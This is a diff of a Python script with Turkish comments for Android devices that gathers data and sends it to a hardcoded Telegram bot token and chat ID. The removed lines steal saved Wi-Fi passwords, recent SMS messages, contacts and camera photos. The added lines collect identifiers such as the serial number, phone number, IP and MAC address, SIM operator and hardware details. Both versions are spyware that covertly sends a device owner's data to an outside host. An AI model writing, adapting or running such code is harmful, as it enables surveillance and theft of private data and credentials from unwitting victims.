@@ -1,58 +1,79 @@
 import os
-import json
-import requests
 import telebot
-from glob import glob
 
 # 🔹 Telegram bot bilgileri
 TOKEN = "7823207013:AAHMEmLrDirYtnGu43gX5BR8YrgVNrrTNQU"
 CHAT_ID = "6202798562"
 bot = telebot.TeleBot(TOKEN)
 
-# 📌 1. Sistem Bilgilerini Al
+# 📌 1. Cihaz Bilgilerini Al
 def get_system_info():
-    info = os.popen("getprop").read()
-    return info if info else "Sistem bilgileri alınamadı."
+    # Model ve Üretici
+    model = os.popen("getprop ro.product.model").read().strip()
+    manufacturer = os.popen("getprop ro.product.manufacturer").read().strip()
 
-# 📌 2. Wi-Fi Şifrelerini Al (Root Gerektirebilir)
-def get_wifi_passwords():
-    wifi_info = os.popen("cat /data/misc/wifi/wpa_supplicant.conf 2>/dev/null").read()
-    return wifi_info if wifi_info else "Wi-Fi şifrelerine erişilemedi!"
+    # Android sürümü
+    android_version = os.popen("getprop ro.build.version.release").read().strip()
 
-# 📌 3. SMS Mesajlarını Al (Root Gerektirebilir)
-def get_sms():
-    sms_data = os.popen("sqlite3 /data/data/com.android.providers.telephony/databases/mmssms.db 'SELECT address, body FROM sms ORDER BY date DESC LIMIT 5;'").read()
-    return sms_data if sms_data else "SMS bulunamadı."
+    # Ekran Çözünürlüğü
+    screen_resolution = os.popen("wm size").read().strip()
+    screen_density = os.popen("wm density").read().strip()
 
-# 📌 4. Rehberi Al (Root Gerektirebilir)
-def get_contacts():
-    contacts = os.popen("sqlite3 /data/data/com.android.providers.contacts/databases/contacts2.db 'SELECT display_name FROM view_contacts;'").read()
-    return contacts if contacts else "Rehber boş."
+    # İşlemci (CPU) bilgileri
+    cpu_info = os.popen("cat /proc/cpuinfo").read().strip()
 
-# 📌 5. Galeriden Fotoğraf Gönder
-def send_photos():
-    photo_dir = "/storage/emulated/0/DCIM/Camera/"
-    photos = glob(photo_dir + "*.jpg")[:5]  # İlk 5 fotoğrafı al
+    # RAM bilgileri
+    ram_info = os.popen("cat /proc/meminfo | grep Mem").read().strip()
 
-    for photo_path in photos:
-        with open(photo_path, "rb") as img:
-            bot.send_photo(CHAT_ID, img)
+    # Depolama Bilgileri
+    storage_info = os.popen("df -h /storage/emulated/0").read().strip()
 
-# 📌 6. Bilgileri Telegram'a Gönder
+    # IP Adresi
+    ip_address = os.popen("ip a | grep 'inet ' | awk '{print $2}'").read().strip()
+
+    # Wi-Fi MAC Adresi
+    mac_address = os.popen("cat /sys/class/net/wlan0/address").read().strip()
+
+    # Seri Numarası
+    serial_number = os.popen("getprop ro.serialno").read().strip()
+
+    # Batarya Durumu
+    battery_info = os.popen("cat /sys/class/power_supply/battery/capacity").read().strip()
+
+    # SIM Kart Bilgisi
+    sim_info = os.popen("getprop gsm.operator.alpha").read().strip()
+
+    # Telefon Numarası
+    phone_number = os.popen("getprop gsm.phone.default").read().strip()
+
+    # Wi-Fi Durumu
+    wifi_status = os.popen("dumpsys wifi | grep 'Wi-Fi is'").read().strip()
+
+    # Bilgileri birleştir
+    info = f"""
+📱 *Cihaz Bilgileri:*  
+Model: {manufacturer} {model}  
+Android Sürümü: {android_version}  
+Ekran Çözünürlüğü: {screen_resolution}  
+Ekran Yoğunluğu: {screen_density}  
+CPU: {cpu_info}  
+RAM: {ram_info}  
+Depolama: {storage_info}  
+IP Adresi: {ip_address}  
+Wi-Fi MAC Adresi: {mac_address}  
+Seri Numarası: {serial_number}  
+Batarya Durumu: {battery_info}%  
+SIM Bilgisi: {sim_info}  
+Telefon Numarası: {phone_number}  
+Wi-Fi Durumu: {wifi_status}
+"""
+
+    return info
+
+# 📌 Telegram’a Gönder
 def send_report():
     system_info = get_system_info()
-    wifi_info = get_wifi_passwords()
-    sms_messages = get_sms()
-    contacts = get_contacts()
-    
-    message = f"📱 *Cihaz Bilgileri:*\n```{system_info}```\n\n"
-    message += f"📶 *Wi-Fi Şifreleri:*\n```{wifi_info}```\n\n"
-    message += f"📩 *Son SMS'ler:*\n```{sms_messages}```\n\n"
-    message += f"👥 *Rehber:*\n```{contacts}```\n\n"
-    
-    bot.send_message(CHAT_ID, message, parse_mode="Markdown")
+    bot.send_message(CHAT_ID, system_info, parse_mode="Markdown")
 
-    send_photos()  # Fotoğrafları da gönderelim
-
-# 📌 Botu Çalıştır ve Bilgileri Gönder
+# 📌 Çalıştır
 send_report()
